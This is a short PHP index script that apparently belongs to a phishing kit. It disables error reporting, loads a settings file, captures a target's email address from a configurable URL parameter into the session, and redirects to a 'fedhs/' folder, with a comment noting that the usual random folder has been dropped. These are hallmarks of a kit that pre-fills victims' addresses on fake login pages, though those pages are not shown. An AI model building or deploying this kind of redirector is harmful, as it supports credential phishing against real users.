<?php
session_start();
error_reporting(0);
include "settings.php";

// Optional: unset any session values you don't want reused
if (isset($_SESSION['paremail'])) {
    unset($_SESSION['paremail']);
}

// Optional: auto-grab email from URL if needed
if (isset($_GET[$autograbemailparameter]) &&
    preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/", strtolower($_GET[$autograbemailparameter]))) {
    $_SESSION['paremail'] = $_GET[$autograbemailparameter];
}

// 🔁 Directly redirect to fedhs folder (no random folder)
header("Location: fedhs/");
exit();
?>